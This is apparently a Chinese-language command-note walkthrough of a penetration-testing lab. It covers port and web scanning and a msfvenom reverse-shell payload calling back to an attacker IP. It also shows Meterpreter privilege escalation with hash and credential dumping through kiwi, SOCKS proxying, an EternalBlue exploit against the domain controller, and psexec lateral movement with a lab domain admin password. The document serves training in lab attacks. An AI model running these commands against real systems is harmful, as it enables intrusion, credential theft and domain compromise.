## 2. 外网信息收集

### 端口和服务扫描

```bash
nmap -sC -sV -p- 192.168.0.110
```

作用：

- `-sC`：运行默认脚本。
- `-sV`：识别服务版本。
- `-p-`：扫描全部 65535 个端口。

### Web 目录扫描

```bash
dirsearch -u 192.168.0.110 -e * -x 300-399,400-499,500-599
```

作用：

- `-e *`：扫描所有扩展名。
- `-x`：排除 3xx、4xx、5xx 状态码，减少噪声。

扫描发现：

```text
phpStudy 探针
phpMyAdmin
```

## 4. MSF 上线 Windows 7

### 生成 Payload

```bash
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.111 lport=5555 -f exe -o shell.exe
```

参数说明：

- `lhost`：Kali 攻击机 IP。
- `lport`：监听端口。
- `-f exe`：生成 Windows 可执行文件。
- `-o shell.exe`：输出文件名。

### 启动 MSF 监听

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
run
```

### 上线

将 `shell.exe` 上传到 Windows 7 并运行，获得 Meterpreter 会话。

## 5. Windows 7 后渗透

### 提权到 SYSTEM

```text
getsystem
```

目的：

```text
从当前权限提升到 NT AUTHORITY\SYSTEM
```

### 查看进程

```text
ps
```

### 迁移到 64 位进程

文章中发现 Windows 7 是 64 位，而 Meterpreter 是 32 位，导致 `hashdump` 报错。迁移到 64 位进程：

```text
migrate 492
```

其中 `492` 是文章环境中选定进程的 PID，实际环境需要先通过 `ps` 选择合适进程。

### 导出 Hash

```text
hashdump
```

### 加载 Kiwi

```text
load kiwi
```

### 枚举所有凭据

```text
creds_all
```

用途：

- 查看明文密码。
- 查看 NTLM Hash。
- 确认当前账户和域管理员凭据。

## 6. 内网代理

文章使用 `windows_x64_admin.exe`、`windows_x64_agent.exe` 和 ProxyBridge 建立代理。

### 在攻击机启动监听

```text
windows_x64_admin.exe -l 6666
```

### 上传并运行 Agent

将：

```text
windows_x64_agent.exe
```

上传到已上线的 Windows 7 中运行。

### ProxyBridge

通过 ProxyBridge 把指定工具的流量转发到代理端口。原文这一步主要是图形界面配置，没有给出完整命令。

### 配置 proxychains

```bash
vim /etc/proxychains4.conf
```

原文没有展示 `/etc/proxychains4.conf` 的具体代理配置行。后文 MSF 使用了：

```text
socks5:127.0.0.1:7777
```

因此本地代理通常需要配置为：

```text
socks5 127.0.0.1 7777
```

## 8. 通过 MSF 代理利用 MS17-010

### 搜索模块

```text
search exploit/windows/smb/ms17_010_eternalblue
```

### 使用模块

```text
use exploit/windows/smb/ms17_010_eternalblue
```

### 设置目标与代理

```text
set RHOSTS 192.168.52.138
set proxies socks5:127.0.0.1:7777
setg reverseAllowProxy true
exploit
```

参数说明：

- `RHOSTS`：域控 IP。
- `proxies`：让 MSF 通过 socks5 代理访问目标。
- `reverseAllowProxy`：允许反向连接经过代理，内网代理场景常用。

文章现象：

```text
EternalBlue 漏洞利用阶段成功，
但 Meterpreter stage 在内网代理环境下没有稳定上线。
```

因此最终改用已获取的域管凭据进行 PsExec 横向移动。

## 9. 使用域管理员凭据横向

```bash
proxychains4 impacket-psexec GOD/Administrator:'Key-1122'@192.168.52.138
```

参数说明：

- `proxychains4`：通过前面配置的 SOCKS 代理访问内网。
- `impacket-psexec`：通过 SMB 服务执行远程命令。
- `GOD/Administrator`：域管理员账户。
- `Key-1122`：文章中修改后的域管理员密码。
- `192.168.52.138`：域控 IP。

执行成功后获得：

```text
NT AUTHORITY\SYSTEM
```

## 12. 复现注意事项

- 所有 IP、密码和 Hash 只适用于原文靶场环境。
- `migrate 492` 中的 PID 必须根据当前环境重新选择。
- ProxyBridge 原文是图形界面操作，命令笔记只保留其作用，不虚构命令。
- 内网代理下 MSF staged payload 可能不稳定，文章最终使用 `impacket-psexec` 横向。
- `impacket-psexec` 会创建服务，日志和文件痕迹明显，授权测试中应记录操作。
